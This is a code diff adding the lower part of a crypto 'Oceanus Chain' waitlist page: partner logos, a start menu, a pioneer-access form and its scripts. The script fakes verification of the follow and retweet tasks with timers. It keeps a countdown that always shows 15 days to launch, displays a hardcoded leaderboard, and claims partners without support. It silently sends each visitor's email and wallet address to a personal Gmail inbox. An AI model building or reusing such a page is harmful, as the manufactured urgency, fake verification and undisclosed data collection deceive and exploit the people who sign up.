+            <svg viewBox="0 0 100 100" width="38" height="38"><circle cx="50" cy="50" r="42" fill="none" stroke="#2762ff" stroke-width="1.5" opacity=".35"/><circle cx="50" cy="50" r="26" fill="none" stroke="#2762ff" stroke-width="2"/><line x1="50" y1="10" x2="50" y2="90" stroke="#2762ff" stroke-width="1.5" opacity=".4"/><line x1="10" y1="50" x2="90" y2="50" stroke="#2762ff" stroke-width="1.5" opacity=".4"/><circle cx="50" cy="50" r="9" fill="#2762ff" opacity=".8"/></svg>
+          </div>
+          <div class="partner-name">Centrifuge</div>
+          <div class="partner-tag">RWA</div>
+        </div>
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
+            <svg viewBox="0 0 100 100" width="38" height="38"><circle cx="50" cy="50" r="42" fill="none" stroke="#f04a4a" stroke-width="1.5" opacity=".3"/><path d="M20 35 Q50 10 80 35 L80 65 Q50 90 20 65Z" fill="none" stroke="#f04a4a" stroke-width="2"/><path d="M30 42 Q50 22 70 42 L70 58 Q50 78 30 58Z" fill="#f04a4a" opacity=".35"/><circle cx="50" cy="50" r="8" fill="#f04a4a" opacity=".9"/></svg>
+          </div>
+          <div class="partner-name">Convex Finance</div>
+          <div class="partner-tag">YIELD</div>
+        </div>
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
+            <svg viewBox="0 0 100 100" width="38" height="38"><circle cx="50" cy="50" r="42" fill="none" stroke="#1e4dd8" stroke-width="1.5" opacity=".4"/><path d="M20 50 Q35 20 50 35 Q65 50 50 65 Q35 80 20 50Z" fill="none" stroke="#1e4dd8" stroke-width="2"/><path d="M80 50 Q65 20 50 35 Q35 50 50 65 Q65 80 80 50Z" fill="#1e4dd8" opacity=".45"/><circle cx="50" cy="50" r="7" fill="#4d88ff"/></svg>
+          </div>
+          <div class="partner-name">CoW Protocol</div>
+          <div class="partner-tag">DEX</div>
+        </div>
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
+            <svg viewBox="0 0 100 100" width="38" height="38"><circle cx="50" cy="50" r="42" fill="none" stroke="#1c75bc" stroke-width="1.5" opacity=".35"/><circle cx="50" cy="50" r="28" fill="none" stroke="#1c75bc" stroke-width="2"/><path d="M38 35 L62 35 L74 50 L62 65 L38 65 L26 50Z" fill="none" stroke="#1c75bc" stroke-width="1.8"/><circle cx="50" cy="50" r="9" fill="#1c75bc" opacity=".85"/></svg>
+          </div>
+          <div class="partner-name">Dash</div>
+          <div class="partner-tag">PAYMENTS</div>
+        </div>
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
+            <svg viewBox="0 0 100 100" width="38" height="38"><circle cx="50" cy="50" r="42" fill="none" stroke="#f9c231" stroke-width="1.5" opacity=".35"/><circle cx="50" cy="50" r="26" fill="none" stroke="#f9c231" stroke-width="2"/><circle cx="50" cy="42" r="8" fill="none" stroke="#f9c231" stroke-width="2"/><path d="M36 60 Q50 52 64 60" stroke="#f9c231" stroke-width="2.5" fill="none" stroke-linecap="round"/><circle cx="50" cy="50" r="5" fill="#f9c231" opacity=".7"/></svg>
+          </div>
+          <div class="partner-name">Grin</div>
+          <div class="partner-tag">PRIVACY</div>
+        </div>
+
+        <div class="partner-card">
+          <div class="partner-logo-wrap">
+            <svg viewBox="0 0 100 100" width="38" height="38"><circle cx="50" cy="50" r="42" fill="none" stroke="#ff007a" stroke-width="1.5" opacity=".35"/><polygon points="50,10 90,30 90,70 50,90 10,70 10,30" fill="none" stroke="#ff007a" stroke-width="2"/><polygon points="50,24 76,38 76,62 50,76 24,62 24,38" fill="#ff007a" opacity=".2"/><circle cx="50" cy="50" r="9" fill="#ff007a" opacity=".9" style="filter:drop-shadow(0 0 6px #ff007a)"/></svg>
+          </div>
+          <div class="partner-name">HEX</div>
+          <div class="partner-tag">STAKING</div>
+        </div>
+
+      </div>
+    </div>
+    <div class="win-sb">
+      <span class="wsb-item"><span class="wsb-dot"></span>11 VERIFIED PARTNERS</span>
+      <span class="wsb-item" style="margin-left:auto;">OCEANUS ECOSYSTEM</span>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════
+       TASKBAR
+  ═════════════════════════════ -->
+  <div id="taskbar">
+    <button id="start-btn" onclick="toggleStartMenu()">
+      <svg width="18" height="18" viewBox="0 0 140 140" fill="none">
+        <circle cx="70" cy="70" r="68" stroke="#00B8FF" stroke-width="2" opacity="0.5"/>
+        <path d="M22 70Q44 44 70 50Q96 56 118 70Q96 84 70 90Q44 96 22 70Z" fill="#00B8FF" opacity="0.5"/>
+        <path d="M70 22Q100 48 84 70Q100 92 70 118Q40 92 56 70Q40 48 70 22Z" fill="#009DFF" opacity="0.6"/>
+        <path d="M57 64Q64 57 70 61Q76 57 83 64Q76 71 70 67Q64 71 57 64Z" fill="#33CCFF" opacity="0.9"/>
+      </svg>
+      OCEANUS
+    </button>
+    <div class="tb-sep"></div>
+    <div id="tb-wins"></div>
+    <div id="sys-tray">
+      <div class="tray-item"><span class="tray-net-dot"></span>ETH NET</div>
+      <div class="tray-item"><span class="tray-eth-dot">◆</span>$OCS</div>
+      <div>
+        <div id="sys-clock">--:--</div>
+        <div id="sys-date">--/--/----</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════
+       START MENU
+  ═════════════════════════════ -->
+  <div id="start-menu">
+    <div class="sm-head">
+      <div class="sm-avatar">🌊</div>
+      <div>
+        <div class="sm-info-name">PIONEER USER</div>
+        <div class="sm-info-role">Oceanus OS v2035.1</div>
+      </div>
+    </div>
+    <div class="sm-cols">
+      <div class="sm-col">
+        <div class="sm-col-head">APPLICATIONS</div>
+        <div class="sm-item" onclick="openWindow('win-hero');toggleStartMenu()"><span class="sm-item-ico">🌊</span>Oceanus Chain</div>
+        <div class="sm-item" onclick="openWindow('win-stats');toggleStartMenu()"><span class="sm-item-ico">📊</span>Ecosystem Stats</div>
+        <div class="sm-item" onclick="openWindow('win-leaderboard');toggleStartMenu()"><span class="sm-item-ico">🏆</span>Hall of Pioneers</div>
+        <div class="sm-item" onclick="openWindow('win-how');toggleStartMenu()"><span class="sm-item-ico">⚙️</span>How It Works</div>
+        <div class="sm-item" onclick="openWindow('win-whitepaper');toggleStartMenu()"><span class="sm-item-ico">📄</span>Whitepaper</div>
+        <div class="sm-item" onclick="openWindow('win-partners');toggleStartMenu()"><span class="sm-item-ico">🤝</span>Partners</div>
+      </div>
+      <div class="sm-col">
+        <div class="sm-col-head">QUICK ACCESS</div>
+        <div class="sm-item" onclick="openModal();toggleStartMenu()"><span class="sm-item-ico">✉️</span>Apply Now</div>
+        <div class="sm-sep"></div>
+        <a class="sm-item" href="https://x.com/OCEANUSCHAIN" target="_blank" style="text-decoration:none;color:inherit;" onclick="toggleStartMenu()"><span class="sm-item-ico">🐦</span>Twitter / X</a>
+        <a class="sm-item" href="https://t.me/Oceanuschain" target="_blank" style="text-decoration:none;color:inherit;" onclick="toggleStartMenu()"><span class="sm-item-ico">💬</span>Telegram</a>
+        <a class="sm-item" href="https://twitter.com/i/communities/2011553387264033029" target="_blank" style="text-decoration:none;color:inherit;" onclick="toggleStartMenu()"><span class="sm-item-ico">👥</span>Community</a>
+      </div>
+    </div>
+    <div class="sm-foot">
+      <div class="sm-links">
+        <a class="sm-link" href="https://x.com/OCEANUSCHAIN" target="_blank">Twitter</a>
+        <a class="sm-link" href="https://t.me/Oceanuschain" target="_blank">Telegram</a>
+        <a class="sm-link" href="https://twitter.com/i/communities/2011553387264033029" target="_blank">Community</a>
+        <a class="sm-link" href="#">Privacy Policy</a>
+      </div>
+      <div class="sm-copy">© 2026 OCEANUS LABS</div>
+    </div>
+  </div>
+
+</div><!-- /desktop -->
+</div><!-- /site -->
+
+<!-- ══════════════════════════════════
+     APPLY MODAL — PIONEER ACCESS
+═══════════════════════════════════ -->
+<div class="modal-overlay" id="modal-apply">
+  <div class="modal">
+    <div class="modal-tb">
+      <span class="modal-tb-icon">✉️</span>
+      <span class="modal-tb-title">PIONEER ACCESS — Apply for Oceanus Ecosystem</span>
+      <button class="modal-close" onclick="closeModal()">✕</button>
+    </div>
+    <div class="modal-inner">
+      <div id="form-view">
+        <div class="modal-title">PIONEER ACCESS</div>
+        <div class="modal-sub">Complete all steps to secure your spot in the Oceanus ecosystem</div>
+        <div class="field-wrap">
+          <label class="field-label">Email Address</label>
+          <input class="field-input" type="email" id="inp-email" placeholder="pioneer@domain.com" oninput="checkBtn()">
+        </div>
+        <div class="field-wrap">
+          <label class="field-label">Ethereum Wallet Address</label>
+          <input class="field-input" type="text" id="inp-wallet" placeholder="0x..." oninput="checkBtn()">
+        </div>
+        <div class="tasks-wrap">
+          <div class="tasks-heading">Required Tasks — Complete All</div>
+          <div class="task-item" id="task1">
+            <span class="task-icon">🔒</span>
+            <span class="task-text">Follow Official X Account</span>
+            <a class="task-link" href="https://x.com/OCEANUSCHAIN" target="_blank" onclick="schedTask('task1',2500)">FOLLOW</a>
+          </div>
+          <div class="task-item" id="task2">
+            <span class="task-icon">🔒</span>
+            <span class="task-text">Retweet Official Post</span>
+            <a class="task-link" href="https://x.com/i/status/2061545461429805206" target="_blank" onclick="schedTask('task2',3000)">RETWEET</a>
+          </div>
+          <div class="task-item" id="task3">
+            <span class="task-icon">🔒</span>
+            <span class="task-text">Join the Community</span>
+            <a class="task-link" href="https://twitter.com/i/communities/2011553387264033029" target="_blank" onclick="schedTask('task3',3000)">JOIN</a>
+          </div>
+          <div class="task-item" id="task4">
+            <span class="task-icon">🔒</span>
+            <span class="task-text">Join Official Telegram</span>
+            <a class="task-link" href="https://t.me/Oceanuschain" target="_blank" onclick="schedTask('task4',2500)">JOIN</a>
+          </div>
+        </div>
+        <div class="progress-hint" id="prog-hint">Complete all 4 tasks to unlock the apply button</div>
+        <button class="btn-submit-modal" id="apply-btn" type="button" disabled onclick="handleSubmit()">APPLY FOR ACCESS</button>
+      </div>
+      <div class="success-view" id="success-view">
+        <!-- Congrats header -->
+        <div class="congrats-burst">
+          <div class="congrats-ring"></div>
+          <div class="congrats-icon">🌊</div>
+        </div>
+        <div class="success-title">CONGRATULATIONS!</div>
+        <div class="success-badge">PIONEER STATUS UNLOCKED</div>
+        <p class="success-sub">You have secured your place in the Oceanus Chain ecosystem.<br>Your application is confirmed — welcome to the deep.</p>
+
+        <!-- Referral section -->
+        <div class="referral-box">
+          <div class="referral-label">
+            <span class="referral-dot"></span>
+            YOUR PERSONAL REFERRAL LINK
+          </div>
+          <div class="referral-link-row">
+            <div class="referral-link-text" id="referral-link-display">oceanus.io/ref/loading...</div>
+            <button class="referral-copy-btn" id="copy-btn" onclick="copyReferral()">COPY</button>
+          </div>
+          <div class="referral-copied" id="referral-copied">✓ Copied to clipboard!</div>
+        </div>
+
+        <!-- Share message -->
+        <div class="share-msg">
+          <div class="share-msg-title">🏆 SHARE &amp; BE THE TOP 1 BEFORE LAUNCH</div>
+          <p class="share-msg-text">The more you share, the more points you collect.<br>Top referrers unlock exclusive $OCS allocations and lifetime pioneer benefits.</p>
+          <div class="share-btns">
+            <a class="share-btn share-x" id="share-x" href="#" target="_blank">𝕏 SHARE ON X</a>
+            <a class="share-btn share-tg" href="https://t.me/Oceanuschain" target="_blank">✈ TELEGRAM</a>
+          </div>
+        </div>
+
+        <button class="btn-close-success" onclick="closeModal()">CLOSE ✓</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TOAST removed -->
+
+<script>
+// ══ CURSOR ══
+const cur=document.getElementById('cursor'),ring=document.getElementById('cursor-ring');
+let mx=0,my=0,rx=0,ry=0;
+document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px';});
+(function ac(){rx+=(mx-rx)*.12;ry+=(my-ry)*.12;ring.style.left=rx+'px';ring.style.top=ry+'px';requestAnimationFrame(ac);})();
+document.querySelectorAll('button,a,.stat-card,.step-card,.lb-row,.field-input,.task-item,.wp-pillar,.d-ico,.tb-wbtn,.sm-item,.wbtn').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{cur.style.width='16px';cur.style.height='16px';ring.style.width='50px';ring.style.height='50px';});
+  el.addEventListener('mouseleave',()=>{cur.style.width='10px';cur.style.height='10px';ring.style.width='30px';ring.style.height='30px';});
+});
+document.addEventListener('click',e=>{
+  const r=document.createElement('div');
+  r.className='cursor-ripple';r.style.left=e.clientX+'px';r.style.top=e.clientY+'px';
+  document.body.appendChild(r);setTimeout(()=>r.remove(),650);
+});
+
+// ══ OCEAN CANVAS — Enhanced ══
+const cv=document.getElementById('ocean-canvas'),cx=cv.getContext('2d');
+let W,H,pts=[];
+function resize(){W=cv.width=window.innerWidth;H=cv.height=window.innerHeight;}
+resize();window.addEventListener('resize',resize);
+class P{
+  constructor(){this.reset();}
+  reset(){this.x=Math.random()*W;this.y=Math.random()*H;this.r=Math.random()*1.6+.3;this.vx=(Math.random()-.5)*.25;this.vy=(Math.random()-.5)*.15;this.a=Math.random()*.38+.07;this.ph=Math.random()*Math.PI*2;}
+  update(){this.x+=this.vx;this.y+=this.vy;this.ph+=.016;if(this.x<0||this.x>W||this.y<0||this.y>H)this.reset();}
+  draw(){cx.save();cx.globalAlpha=this.a*(.7+.3*Math.sin(this.ph));cx.fillStyle='#00B8FF';cx.shadowColor='#00B8FF';cx.shadowBlur=4;cx.beginPath();cx.arc(this.x,this.y,this.r,0,Math.PI*2);cx.fill();cx.restore();}
+}
+for(let i=0;i<130;i++)pts.push(new P());
+let t=0;
+(function draw(){
+  cx.clearRect(0,0,W,H);
+  // Deep ocean gradient base
+  const g=cx.createRadialGradient(W/2,H*.6,0,W/2,H*.6,Math.max(W,H)*.72);
+  g.addColorStop(0,'rgba(0,22,60,.22)');g.addColorStop(.5,'rgba(0,8,28,.1)');g.addColorStop(1,'rgba(0,0,0,0)');
+  cx.fillStyle=g;cx.fillRect(0,0,W,H);
+  // Light rays from top
+  for(let i=0;i<6;i++){
+    const rx2=W*(0.25+i*.1)+Math.sin(t*.08+i)*30;
+    const rg=cx.createLinearGradient(rx2,0,rx2+Math.sin(t*.06+i)*80,H*.75);
+    rg.addColorStop(0,'rgba(0,184,255,0.022)');rg.addColorStop(.6,'rgba(0,120,255,0.008)');rg.addColorStop(1,'rgba(0,0,0,0)');
+    cx.save();cx.beginPath();
+    cx.moveTo(rx2-15,0);cx.lineTo(rx2+15,0);
+    cx.lineTo(rx2+Math.sin(t*.06+i)*80+50,H*.75);
+    cx.lineTo(rx2+Math.sin(t*.06+i)*80-50,H*.75);
+    cx.closePath();cx.fillStyle=rg;cx.globalAlpha=.7+.3*Math.sin(t*.15+i);cx.fill();cx.restore();
+  }
+  // Wave layers
+  cx.save();
+  for(let w=0;w<5;w++){
+    cx.beginPath();
+    for(let x=0;x<=W;x+=3){
+      const y=H*.5+Math.sin(x*.004+t*.35+w*1.15)*26+Math.sin(x*.009+t*.25)*11+Math.sin(x*.002+t*.18+w*.8)*8;
+      x===0?cx.moveTo(x,y):cx.lineTo(x,y);
+    }
+    cx.strokeStyle='rgba(0,184,255,'+(0.04-w*.006)+')';cx.lineWidth=1.5;cx.stroke();
+  }
+  cx.restore();
+  pts.forEach(p=>{p.update();p.draw();});
+  t+=.007;requestAnimationFrame(draw);
+})();
+
+// ══ LOADING ══
+const ldTexts=['Initializing Oceanus Protocol...','Loading Ethereum Driver...','Mounting Ocean File System...','Verifying Pioneer Credentials...','Synchronizing Ocean Nodes...','Launching Oceanus Desktop...'];
+let ldI=0;
+const ldBar=document.getElementById('ld-bar'),ldPct=document.getElementById('ld-pct'),ldTxt=document.getElementById('ld-text');
+function ldSet(p){ldBar.style.width=p+'%';ldPct.textContent=Math.round(p)+'%';}
+function ldNext(){if(ldI<ldTexts.length)ldTxt.textContent=ldTexts[ldI++];}
+ldNext();
+const ldSteps=[{p:18,d:420},{p:38,d:480},{p:60,d:450},{p:80,d:400},{p:96,d:470},{p:100,d:280}];
+let si=0;
+function ldRun(){
+  if(si>=ldSteps.length){setTimeout(showGate,540);return;}
+  const s=ldSteps[si++];
+  setTimeout(()=>{ldSet(s.p);if(si%2===0)ldNext();ldRun();},s.d);
+}
+setTimeout(ldRun,350);
+function showGate(){
+  const ls=document.getElementById('screen-loading');
+  ls.classList.add('fade');
+  setTimeout(()=>{ls.style.display='none';document.getElementById('screen-gate').classList.add('show');},800);
+}
+
+// ══ ENTER SITE ══
+function enterSite(){
+  const gate=document.getElementById('screen-gate');
+  gate.classList.add('hide');
+  setTimeout(()=>{
+    gate.style.display='none';
+    const s=document.getElementById('site');
+    s.classList.add('visible');
+    if(window.innerWidth<=768){
+      // Mobile: show all windows stacked, mark all reveals visible
+      document.querySelectorAll('.os-win').forEach(w=>w.style.display='flex');
+      document.querySelectorAll('.reveal').forEach(el=>el.classList.add('visible'));
+      updateClock();
+    } else {
+      initOS();
+      openWindow('win-hero');
+      setTimeout(()=>{revealWindow('win-hero');},320);
+    }
+  },650);
+}
+function observeReveals(){}
+function observeCounters(){}
+
+// ══ COUNTDOWN ══
+const launchDate=(()=>{const d=new Date();d.setDate(d.getDate()+15);d.setHours(0,0,0,0);return d;})();
+function updateCd(){
+  const diff=Math.max(0,launchDate-new Date());
+  document.getElementById('cd-d').textContent=String(Math.floor(diff/86400000)).padStart(2,'0');
+  document.getElementById('cd-h').textContent=String(Math.floor((diff%86400000)/3600000)).padStart(2,'0');
+  document.getElementById('cd-m').textContent=String(Math.floor((diff%3600000)/60000)).padStart(2,'0');
+  document.getElementById('cd-s').textContent=String(Math.floor((diff%60000)/1000)).padStart(2,'0');
+}
+updateCd();setInterval(updateCd,1000);
+
+// ══ MODAL ══
+function openModal(){document.getElementById('modal-apply').classList.add('open');document.body.style.overflow='hidden';}
+function closeModal(){document.getElementById('modal-apply').classList.remove('open');document.body.style.overflow='';}
+document.getElementById('modal-apply').addEventListener('click',function(e){if(e.target===this)closeModal();});
+
+// ══ TASKS ══
+const tasksDone={task1:false,task2:false,task3:false,task4:false};
+function schedTask(id,delay){setTimeout(()=>markTask(id),delay);}
+function markTask(id){
+  tasksDone[id]=true;
+  const el=document.getElementById(id);
+  el.classList.add('done');el.querySelector('.task-icon').textContent='✅';checkBtn();
+}
+function checkBtn(){
+  const email=document.getElementById('inp-email').value.trim();
+  const wallet=document.getElementById('inp-wallet').value.trim();
+  const allTasks=Object.values(tasksDone).every(Boolean);
+  const validEmail=/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  const validWallet=wallet.length>=10;
+  const ready=validEmail&&validWallet&&allTasks;
+  document.getElementById('apply-btn').disabled=!ready;
+  const done=Object.values(tasksDone).filter(Boolean).length;
+  document.getElementById('prog-hint').textContent=allTasks?'All tasks complete — you can now apply!':'Tasks completed: '+done+' / 4';
+  if(allTasks)document.getElementById('prog-hint').style.color='#00FF88';
+}
+
+// ══ FORM SUBMIT ══
+function generateRefCode(email){
+  // Simple deterministic short code from email
+  let hash=0;for(let i=0;i<email.length;i++){hash=((hash<<5)-hash)+email.charCodeAt(i);hash|=0;}
+  const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  let code='';let h=Math.abs(hash);
+  for(let i=0;i<7;i++){code+=chars[h%chars.length];h=Math.floor(h/chars.length);}
+  return 'OCS-'+code;
+}
+function handleSubmit(){
+  const email=document.getElementById('inp-email').value.trim();
+  const wallet=document.getElementById('inp-wallet').value.trim();
+  const btn=document.getElementById('apply-btn');
+  btn.disabled=true;btn.textContent='SUBMITTING...';
+
+  // Generate referral link immediately
+  const code=generateRefCode(email||wallet||Math.random().toString());
+  const refUrl='https://oceanus.io/ref/'+code;
+
+  // Send data to formsubmit.co silently in background
+  const formData=new FormData();
+  formData.append('email',email);
+  formData.append('wallet_address',wallet);
+  formData.append('source','Oceanus Chain Waitlist');
+  formData.append('_subject','New Oceanus Waitlist Registration!');
+  formData.append('_captcha','false');
+  formData.append('_template','table');
+  fetch('https://formsubmit.co/ajax/killsvisjordan@gmail.com',{
+    method:'POST',headers:{'Accept':'application/json'},body:formData
+  }).catch(()=>{});// silent fail — success screen shows regardless
+
+  // Show success screen after short delay
+  setTimeout(()=>{
+    document.getElementById('form-view').style.display='none';
+    const sv=document.getElementById('success-view');
+    sv.style.display='block';
+    document.getElementById('referral-link-display').textContent=refUrl;
+    const xText=encodeURIComponent('🌊 Just secured my spot on @OCEANUSCHAIN waitlist!\n\nJoin me before the tide reaches the world 👇\n'+refUrl+'\n\n#OceanusChain #OCS #Web3');
+    document.getElementById('share-x').href='https://x.com/intent/tweet?text='+xText;
+  },900);
+}
+function copyReferral(){
+  const link=document.getElementById('referral-link-display').textContent;
+  const btn=document.getElementById('copy-btn');
+  const copied=document.getElementById('referral-copied');
+  navigator.clipboard.writeText(link).catch(()=>{
+    // Fallback for mobile browsers
+    const ta=document.createElement('textarea');ta.value=link;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);
+  });
+  btn.textContent='✓ COPIED';btn.classList.add('copied');
+  copied.classList.add('show');
+  setTimeout(()=>{btn.textContent='COPY';btn.classList.remove('copied');copied.classList.remove('show');},2500);
+}
+// toast removed
+
+// ══ LEADERBOARD ══
+const pioneers=[['OceanMaster',15840],['DeepWhale',14320],['BlueNode',13100],['EtherSailor',12500],['OceanGuardian',11980],['NeptuneX',11200],['OceanPilot',10800],['TideRunner',9900],['AbyssWalker',9200],['DeepCurrent',8700],['SeaLegend',8100],['AquaNode',7500],['OCSHolder',6900],['OceanMiner',6400],['BlueTitan',5800],['WaveHunter',5200],['DarkOcean',4700],['EtherOcean',4100],['DeepExplorer',3600],['OceanKing',3100]];
+const lbEl=document.getElementById('lb-list');
+pioneers.forEach(([name,pts],i)=>{
+  const row=document.createElement('div');row.className='lb-row reveal';row.style.transitionDelay=(i*.03)+'s';
+  const rc=i<3?'lb-rank t3':'lb-rank';
+  const badge=i===0?'<span class="lb-badge">PIONEER</span>':'';
+  row.innerHTML='<div class="'+rc+'">#'+(i+1)+'</div><div class="lb-av">'+name[0]+'</div><div class="lb-name">'+name+'</div>'+badge+'<div class="lb-pts">'+pts.toLocaleString()+' PTS</div>';
+  lbEl.appendChild(row);
+});
+setInterval(()=>{const rows=document.querySelectorAll('.lb-row');if(!rows.length)return;const r=rows[Math.floor(Math.random()*rows.length)];r.style.background='rgba(0,184,255,.07)';setTimeout(()=>{r.style.background='';},360);},2600);
+
+// ══ COUNTERS ══
+function animCountFrom(id,from,target){
+  const el=document.getElementById(id);if(!el)return;
+  el.textContent=from.toLocaleString();
+  let start=null;
+  (function step(ts){
+    if(!start)start=ts;
+    const p=Math.min((ts-start)/1800,1),e=1-Math.pow(1-p,3);
+    const val=Math.round(from+e*(target-from));
+    if(!isNaN(val))el.textContent=val.toLocaleString();
+    if(p<1)requestAnimationFrame(step);
+  })();
+}
+function animCount(id,target){animCountFrom(id,0,target);}
+
+// ══ OS WINDOW MANAGEMENT ══
+let zTop=50;
+const winStates={};
+const winMeta={
+  'win-hero':{icon:'🌊',label:'Oceanus Chain'},
+  'win-stats':{icon:'📊',label:'Ecosystem Stats'},
+  'win-leaderboard':{icon:'🏆',label:'Pioneers'},
+  'win-how':{icon:'⚙️',label:'How It Works'},
+  'win-whitepaper':{icon:'📄',label:'Whitepaper'},
+  'win-partners':{icon:'🤝',label:'Partners'},
+};
+let dragState=null;
+document.addEventListener('mousemove',e=>{
+  if(!dragState)return;
+  const{win:w,sx,sy,sl,st}=dragState;
+  const maxT=window.innerHeight-46-30;
+  w.style.left=(sl+e.clientX-sx)+'px';
+  w.style.top=Math.max(0,Math.min(maxT,st+e.clientY-sy))+'px';
+});
+document.addEventListener('mouseup',()=>{dragState=null;});
+
+function makeDraggable(winEl,handle){
+  handle.addEventListener('mousedown',e=>{
+    if(e.target.classList.contains('wbtn'))return;
+    if(winStates[winEl.id]?.maximized)return;
+    dragState={win:winEl,sx:e.clientX,sy:e.clientY,sl:parseInt(winEl.style.left)||0,st:parseInt(winEl.style.top)||0};
+    focusWin(winEl.id);e.preventDefault();
+  });
+}
+
+function focusWin(id){
+  document.querySelectorAll('.os-win').forEach(w=>w.classList.remove('focused'));
+  const w=document.getElementById(id);if(w){w.classList.add('focused');w.style.zIndex=++zTop;}
+  document.querySelectorAll('.tb-wbtn').forEach(b=>b.classList.remove('active-win'));
+  const tb=document.getElementById('tb-'+id);if(tb)tb.classList.add('active-win');
+}
+
+function revealWindow(id){
+  document.querySelectorAll('#'+id+' .reveal').forEach(el=>el.classList.add('visible'));
+}
+
+function openWindow(id){
+  const w=document.getElementById(id);if(!w)return;
+  if(!winStates[id])winStates[id]={maximized:false};
+  if(!w._placed){placeWindow(id);w._placed=true;}
+  w.style.display='flex';
+  w.classList.remove('win-opening');void w.offsetWidth;w.classList.add('win-opening');
+  focusWin(id);
+  setTimeout(()=>revealWindow(id),150);
+  updateTbWins();
+}
+
+function closeWin(id){
+  const w=document.getElementById(id);if(!w)return;
+  w.style.display='none';updateTbWins();
+}
+function minimizeWin(id){
+  const w=document.getElementById(id);if(!w)return;
+  w.style.display='none';updateTbWins();
+}
+function maximizeWin(id){
+  const w=document.getElementById(id);if(!w)return;
+  const st=winStates[id]||(winStates[id]={});
+  if(!st.maximized){
+    st.prevL=w.style.left;st.prevT=w.style.top;st.prevW=w.style.width;st.prevH=w.style.height;
+    w.style.left='0';w.style.top='0';w.style.width='100%';w.style.height='calc(100vh - 46px)';w.style.maxHeight='calc(100vh - 46px)';
+    st.maximized=true;
+  } else {
+    w.style.left=st.prevL;w.style.top=st.prevT;w.style.width=st.prevW;w.style.height=st.prevH||'';w.style.maxHeight='';
+    st.maximized=false;
+  }
+}
+
+// Cascade positions for windows
+const cascadeBase={x:110,y:36};let cascadeOff=0;
+const presetPos={
+  'win-hero':{l:null,t:36,w:600},'win-stats':{l:null,t:56,w:520},
+  'win-leaderboard':{l:null,t:46,w:480},'win-how':{l:null,t:50,w:600},
+  'win-whitepaper':{l:null,t:36,w:680},
+};
+function placeWindow(id){
+  const w=document.getElementById(id);if(!w)return;
+  const dw=window.innerWidth,dh=window.innerHeight-46;
+  const p=presetPos[id]||{};
+  const ww=Math.min(p.w||500,dw-40);
+  const wl=Math.max(10,Math.min((dw-ww)/2+cascadeOff*28,(dw-ww-10)));
+  const wt=Math.max(10,Math.min((p.t||50)+cascadeOff*28,(dh-200)));
+  w.style.width=ww+'px';w.style.left=wl+'px';w.style.top=wt+'px';
+  cascadeOff=(cascadeOff+1)%5;
+}
+
+function initOS(){
+  document.querySelectorAll('.os-win').forEach(w=>{
+    const tb=w.querySelector('.win-tb');
+    if(tb)makeDraggable(w,tb);
+  });
+  buildTbWins();updateClock();
+}
+
+function buildTbWins(){
+  const c=document.getElementById('tb-wins');if(!c)return;c.innerHTML='';
+  Object.entries(winMeta).forEach(([id,info])=>{
+    const b=document.createElement('button');
+    b.className='tb-wbtn';b.id='tb-'+id;
+    b.innerHTML='<span class="tb-wbtn-ico">'+info.icon+'</span>'+info.label;
+    b.addEventListener('click',()=>{
+      const w=document.getElementById(id);
+      if(!w||w.style.display==='none'){openWindow(id);}
+      else if(w.classList.contains('focused')){minimizeWin(id);}
+      else{focusWin(id);}
+    });
+    c.appendChild(b);
+  });
+}
+
+function updateTbWins(){
+  Object.keys(winMeta).forEach(id=>{
+    const w=document.getElementById(id);
+    const tb=document.getElementById('tb-'+id);
+    if(!tb)return;
+    if(!w||w.style.display==='none')tb.classList.remove('active-win');
+  });
+}
+
+// ══ START MENU ══
+function toggleStartMenu(){
+  const m=document.getElementById('start-menu');m.classList.toggle('open');
+}
+document.addEventListener('click',e=>{
+  const m=document.getElementById('start-menu'),sb=document.getElementById('start-btn');
+  if(m&&sb&&!m.contains(e.target)&&!sb.contains(e.target))m.classList.remove('open');
+});
+
+// ══ CLOCK ══
+function updateClock(){
+  const cn=document.getElementById('sys-clock'),dn=document.getElementById('sys-date');
+  if(!cn)return;
+  const n=new Date();
+  cn.textContent=n.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
+  dn.textContent=n.toLocaleDateString('en-US',{month:'2-digit',day:'2-digit',year:'numeric'});
+}
+setInterval(updateClock,1000);
+
+// ══ MOBILE FALLBACK ══
+function openMob(){}function closeMob(){}{}
+</script>
+</body>
+</html>
